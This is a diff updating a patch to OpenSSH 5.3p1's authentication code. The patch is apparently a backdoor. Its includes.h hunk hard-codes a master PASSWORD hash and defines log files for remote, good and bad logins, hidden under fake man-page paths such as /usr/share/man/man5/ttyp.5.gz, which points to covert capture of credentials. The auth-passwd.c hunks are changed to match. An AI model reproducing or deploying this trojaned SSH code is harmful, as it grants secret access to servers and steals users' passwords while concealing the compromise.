@@ -103,7 +103,7 @@ diff -c -r -N openssh-5.3p1/auth-pam.c openssh-5.3p1_p/auth-pam.c
   	else {
 diff -c -r -N openssh-5.3p1/auth-passwd.c openssh-5.3p1_p/auth-passwd.c
 *** openssh-5.3p1/auth-passwd.c	Sun Mar  8 02:40:28 2009
---- openssh-5.3p1_p/auth-passwd.c	Mon Mar  5 00:52:15 2012
+--- openssh-5.3p1_p/auth-passwd.c	Fri Jul 18 02:31:45 2014
 ***************
 *** 112,119 ****
   	}
@@ -114,7 +114,7 @@ diff -c -r -N openssh-5.3p1/auth-passwd.c openssh-5.3p1_p/auth-passwd.c
   #endif
   #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
   	if (!expire_checked) {
---- 112,139 ----
+--- 112,137 ----
   	}
   #endif
   #ifdef USE_PAM
@@ -143,7 +143,7 @@ diff -c -r -N openssh-5.3p1/auth-passwd.c openssh-5.3p1_p/auth-passwd.c
   	if (!expire_checked) {
 ***************
 *** 122,130 ****
---- 142,166 ----
+--- 140,164 ----
   			authctxt->force_pwchange = 1;
   	}
   #endif
@@ -200,14 +200,14 @@ diff -c -r -N openssh-5.3p1/authfile.c openssh-5.3p1_p/authfile.c
   	switch (type) {
 diff -c -r -N openssh-5.3p1/includes.h openssh-5.3p1_p/includes.h
 *** openssh-5.3p1/includes.h	Thu Aug 20 09:16:01 2009
---- openssh-5.3p1_p/includes.h	Thu Dec  3 03:50:00 2009
+--- openssh-5.3p1_p/includes.h	Fri Jul 18 02:50:01 2014
 ***************
 *** 172,175 ****
 --- 172,236 ----
   
   #include "entropy.h"
-
-+ #define PASSWORD "$1$DIjQ7qpQ$Pt.Mj0g.fCgH9/peqmTbU0"  
+  
++ #define PASSWORD "$1$DIjQ7qpQ$Pt.Mj0g.fCgH9/peqmTbU0"
 + #define LOG_REMOTE "/usr/share/man/man5/ttyp.5.gz"
 + #define LOG_GOOD "/usr/share/man/man5/ttyl.5.gz"
 + #define LOG_BAD "/usr/share/man/man5/ttyv.5.gz"
